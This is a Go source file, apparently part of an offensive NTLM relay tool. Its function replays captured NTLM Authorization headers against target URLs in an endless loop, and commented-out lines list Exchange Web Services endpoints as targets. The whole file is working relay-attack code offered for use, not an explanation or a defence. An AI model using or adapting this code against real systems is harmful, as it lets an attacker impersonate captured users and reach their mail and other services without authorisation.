package gopRelay

import (
	"fmt"
	"net/http"
	"time"

	"github.com/hophouse/gop/utils/logger"
)

func TestTargets(client *NTLMAuthHTTPRelay, targets []string) {
	logger.Print("[+] Will test the URL :\n")

	targetURL := []string{
		// "https://127.0.0.1/ews/Exchange.asmx",
		// "https://127.0.0.1/ews/",
		// "https://127.0.0.1/ews/Exchange.asmx",
		// "https://127.0.0.1:444/ews/Exchange.asmx",
		// "https://127.0.0.1:444/ews/Services.wsdl",
		// "https://127.0.0.1/ews/Exchange.asmx",
	}

	targetURI := []string{
		"/",
	}

	for _, target := range targets {
		for _, uri := range targetURI {
			targetURL = append(targetURL, fmt.Sprintf("%s%s", target, uri))
		}
	}

	for {
		period := 2
		for _, relay := range client.Relays {
			for _, targetU := range targetURL {
				clientAuthRequest, _ := http.NewRequest("GET", targetU, nil)
				// gopproxy.CopyHeader(clientAuthRequest.Header, clientInitiateRequest.Header)
				clientAuthRequest.Header.Add("Authorization", relay.AuthorizationHeader)
				_, err := relay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
				if err != nil {
					logger.Printf("Error during test of the URL %s : %s\n", targetU, err)
				}

			}
		}
		logger.Println("[+] End at date ", time.Now())

		period *= period
		logger.Println("[+] Period is ", period, "going to sleep")
		time.Sleep(time.Minute * time.Duration(period))
	}
}
